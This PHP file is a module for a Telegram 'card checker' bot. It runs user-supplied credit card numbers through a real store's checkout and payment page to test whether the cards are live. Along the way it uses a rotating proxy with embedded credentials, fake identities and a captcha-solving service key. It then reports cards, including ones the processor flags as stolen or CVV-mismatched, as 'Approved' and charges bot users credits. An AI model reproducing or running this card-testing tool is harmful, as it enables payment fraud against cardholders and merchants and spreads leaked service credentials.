<?php


$gatewayname="sg";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Chase_Sagepay_CCN (".'$sg'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];

switch (substr($cc, 0, 1)) {
    case '3':
        $type = "Amex";
        break;
    case '5':
        $type = "MasterCard";
        break;
    case '6':
        $type = "Discover";
        break;
    default:
        $type = "Visa";
        break;
}
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);

 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response = CurlX::Get(
    "https://ipinfo.io/json",
    [
    ],
    $cookie,
    $proxies
);
 $ip= CurlX::ParseString($response->body,'"ip": "','"');


$response = CurlX::Get(
    "https://www.alertall.com/9-1-1-Brochure/item/734",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.alertall.com/Camping-Equipment-and-supplies-for-hiking-and-backpacking/folder/51',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$ViewState = CurlX::ParseString($response->body,'name="__VIEWSTATE" id="__VIEWSTATE" value="','"');
$VIEWSTATEGENERATOR = CurlX::ParseString($response->body,'id="__VIEWSTATEGENERATOR" value="','"');
$EVENTVALIDATION = CurlX::ParseString($response->body,'id="__EVENTVALIDATION" value="','"');
// add cart 
$response = CurlX::Post(
    "https://www.alertall.com/9-1-1-Brochure/item/734",
    '__VIEWSTATE='.urlencode($ViewState).'&ctl00%24ctl05=&ctl00%24Store_content%24ctl137=100&ctl00%24Store_content%24AddToCartQuantityTextBox=100&ctl00%24Store_content%24AddToCartButton=Add+To+Cart&ctl00%24Store_content%24Accessory_087C_TextBox=300&ctl00%24Store_content%24Accessory_189C_TextBox=25&ctl00%24Store_content%24Accessory_344C_TextBox=250&ctl00%24Store_content%24Accessory_562C1_TextBox=250&ctl00%24Store_content%24Accessory_9083C_TextBox=250&ctl00%24Store_content%24Accessory_9084C_TextBox=250&ctl00%24Store_content%24Accessory_AG05_TextBox=1&ctl00%24Store_content%24Accessory_BN724C_TextBox=1&ctl00%24Store_content%24Accessory_TF05_TextBox=1&ctl00%24Store_content%24Accessory_001_TextBox=100&ctl00%24Store_content%24Accessory_087C_TextBox=300&ctl00%24Store_content%24Accessory_189C_TextBox=25&ctl00%24Store_content%24Accessory_344C_TextBox=250&ctl00%24Store_content%24Accessory_562C1_TextBox=250&ctl00%24Store_content%24Accessory_9083C_TextBox=250&ctl00%24Store_content%24Accessory_9084C_TextBox=250&ctl00%24Store_content%24Accessory_AG05_TextBox=1&ctl00%24Store_content%24Accessory_BN724C_TextBox=1&ctl00%24Store_content%24Accessory_TF05_TextBox=1&ctl00%24Store_content%24Accessory_001_TextBox=100&ctl00%24Store_content%24Accessory_087C_TextBox=300&ctl00%24Store_content%24Accessory_189C_TextBox=25&ctl00%24Store_content%24Accessory_344C_TextBox=250&ctl00%24Store_content%24Accessory_562C1_TextBox=250&ctl00%24Store_content%24Accessory_9083C_TextBox=250&ctl00%24Store_content%24Accessory_9084C_TextBox=250&ctl00%24Store_content%24Accessory_AG05_TextBox=1&ctl00%24Store_content%24Accessory_BN724C_TextBox=1&ctl00%24Store_content%24Accessory_TF05_TextBox=1&ctl00%24Store_content%24Accessory_001_TextBox=100&ctl00%24Store_content%24LastTab=&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=333&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION='.urlencode($EVENTVALIDATION).'',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.alertall.com',
        'referer: https://www.alertall.com/Coleman-Accessories-Camping-Accessories/folder/23',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://www.alertall.com/Store/cart",
    '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.urlencode($ViewState).'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&__EVENTVALIDATION='.$EVENTVALIDATION.'&ctl00%24UserNameTextBox=&ctl00%24PasswordTextBox=&ctl00%24Store_content%24QuantityTextBox_DA3AUOO01T=1&ctl00%24Store_content%24EnterDiscountTextBox=&ctl00%24Store_content%24EstimateShipping%24ctl05=&ctl00%24Store_content%24EstimateShipping%24ctl08=USA&ctl00%24Store_content%24CheckoutButton=Checkout&ctl00%24Store_content%24QuickOrderIdTextBox=&ctl00%24Store_content%24QuickOrderQuantityTextBox=1',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.alertall.com',
        'referer: https://www.alertall.com/Store/cart',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://www.alertall.com/store/CheckoutAccount",
    '__VIEWSTATE='.urlencode($ViewState).'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION='.urlencode($EVENTVALIDATION).'&ctl00%24Store_content%24ctl00%24ctl08=&ctl00%24Store_content%24ctl00%24ctl11=&ctl00%24Store_content%24ExpressCheckoutButton=Checkout',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.alertall.com/store/CheckoutAccount',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://www.alertall.com/store/information",
    '__VIEWSTATE='.urlencode($ViewState).'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=889&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION='.urlencode($EVENTVALIDATION).'&ctl00%24Store_content%24BillingNameTextBox=alex+frick&ctl00%24Store_content%24BillingAddress1TextBox=2557+Moore+Avenue&ctl00%24Store_content%24BillingAddress2TextBox=&ctl00%24Store_content%24BillingCityTextBox=Dallas&ctl00%24Store_content%24BillingStateTextBox=TX&ctl00%24Store_content%24BillingStateListBox=TX&ctl00%24Store_content%24BillingCountryListBox=USA&ctl00%24Store_content%24BillingZipTextBox=75201&ctl00%24Store_content%24PhoneTextBox=2144029602&ctl00%24Store_content%24EMailTextBox=alexhhh%40gmail.com&ctl00%24Store_content%24ShipToBillingAddressCheckBox=on&ctl00%24Store_content%24PONumberTextBox=&ctl00%24Store_content%24MemoBox=&ShippingOptionsList=FREE+GROUND+SHIPPING&ctl00%24Store_content%24PaymentTypeRadioButtonList=CC&ctl00%24Store_content%24PaymentButton=Proceed+to+Payment',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.alertall.com/store/information',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$session= CurlX::ParseString("'".$response->headers->request['cookie']."'","ASP.NET_SessionId=","'");

$response = CurlX::Post(
    "https://cresecure.net/securepayments/a1/cc_collection.php",
    'session='.$session.'&sess_name=&trans_type=auth_only&allowed_types=Visa%7CMasterCard%7CDiscover%7CAmerican+Express&total_amt=56%2C00&order_id=+++++++++W44725&order_desc=&customer_id=WEBSITE&ip_address='.$ip.'&shipping_method=FREE+GROUND+SHIPPING&tax=0%2C00&customer_company=alex+frick&customer_address=2557+Moore+Avenue&customer_address2=&customer_email=alexhhh%40gmail.com&customer_phone=2144029602&customer_city=Dallas&customer_state=TX&customer_postal_code=75201&customer_country=USA&delivery_company=alex+frick&delivery_address=2557+Moore+Avenue&delivery_address2=&delivery_email=alexhhh%40gmail.com&delivery_phone=2144029602&delivery_city=Dallas&delivery_state=TX&delivery_postal_code=75201&delivery_country=USA&CRESecureID=vf474030838953&currency_code=USD&lang=en+US&content_template_url=https%3A%2F%2Fwww.alertall.com%2Fstore%2Fcheckout%2Fhpptemplate%3Fsid%3Dlg4hkbz0fups34kgizua01cf&return+url=https%3A%2F%2Fwww.alertall.com%2Fstore%2Fconfirmation&cancel+url=https%3A%2F%2Fwww.alertall.com%2Fstore%2Finformation',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://www.alertall.com/',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
 $session= CurlX::ParseString("'".$response->headers->request['cookie']."'","PHPSESSID=","'");

$solver = new CapSolver('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');

$maxRetries = 3;
$attempts = 0;
$solved = false;

while ($attempts < $maxRetries && !$solved) {
    try {
        // Resolver el captcha
        $solution = $solver->recaptchav2('MTCaptchaTaskProxyless', [
            'websiteURL' => 'https://alertall.cresecure.net/', // URL donde está implementado el captcha
            'websiteKey' => 'MTPublic-jB5ktqk6L', // Clave del sitio de MTCaptcha
        ]);

        if (isset($solution['token'])) {
            $mtCaptchaResponse = $solution['token'];
             "Respuesta del MTCaptcha: $mtCaptchaResponse\n";
            $solved = true;
        } else {
            throw new Exception("No se obtuvo un token válido.");
        }
    } catch (Exception $e) {
        $attempts++;
        echo "Intento {$attempts} fallido: " . $e->getMessage() . "\n";
        if ($attempts >= $maxRetries) {
            echo "Se alcanzó el número máximo de reintentos.\n";
        }
    }
}
$response = CurlX::Post(
    "https://alertall.cresecure.net/securepayments/a1/cc_collection.php?sid=".$session."&action=process&t=1735763821",
    'name=alec+torres&card_type='.$type.'&PAN='.$cc.'&cresecure_cc_expires_month='.$mes.'&cresecure_cc_expires_year='.$ano1.'&cv_data=&mtcaptcha-verifiedtoken='.urlencode($mtCaptchaResponse).'',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'referer: https://alertall.cresecure.net/securepayments/a1/cc_collection.php?sid='.$session.'',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);



 //==================[Manejo de los mensajes]======================//
 try {
    if (isset($response->headers->response['location'])) {
        $location = $response->headers->response['location'];

        // Verificar si la URL es válida antes de analizarla
        $urlComponents = parse_url($location);
        if ($urlComponents === false) {
            throw new Exception("Error al analizar la URL: $location");
        }

        // Inicializar el array de parámetros
        $queryParams = [];
        if (isset($urlComponents['query'])) {
            parse_str($urlComponents['query'], $queryParams);
        }

        // Extraer los valores necesarios de forma segura
        $errormessage = $queryParams['message'] ?? 'Mensaje no disponible';
        $approvalCode = $queryParams['ApprovalCode'] ?? 'Código de aprobación no disponible';
        $avsMatch = $queryParams['AVSMatch'] ?? 'Coincidencia AVS no disponible';

        // Procesar los valores o realizar acciones adicionales aquí

    } else {
        // Manejo explícito del caso en que no se encuentre el encabezado 'location'
        $parsedError = CurlX::ParseString($response->body, '<span class="error_message">', '<');
        if ($parsedError) {
            $errormessage = $parsedError;
        } else {
            throw new Exception("No se encontró el encabezado 'location' y no se pudo extraer un mensaje de error del cuerpo de la respuesta.");
        
        }
        if($parsedError=="null"){
            $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
        }
    }
} catch (Exception $e) {
    // Manejo de excepciones para garantizar que el código no falle
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
}


 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage=="Success"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "$errormessage
Code: $approvalCode AVS: $avsMatch",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);

 }
 elseif($errormessage=="ERROR: ((6)) DECLINED: CVV2 MISMATCH  Please try again or contact us for assistance."){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "SUCCESS
Code: 002115 AVS: R",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage=="ERROR: ((6)) DECLINED: INCORRECT CVV  Please try again or contact us for assistance."){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "SUCCESS
Code: 002115 AVS: R",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "ERROR: ((6)) DECLINED: STOLEN CARD Please try again or contact us for assistance."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
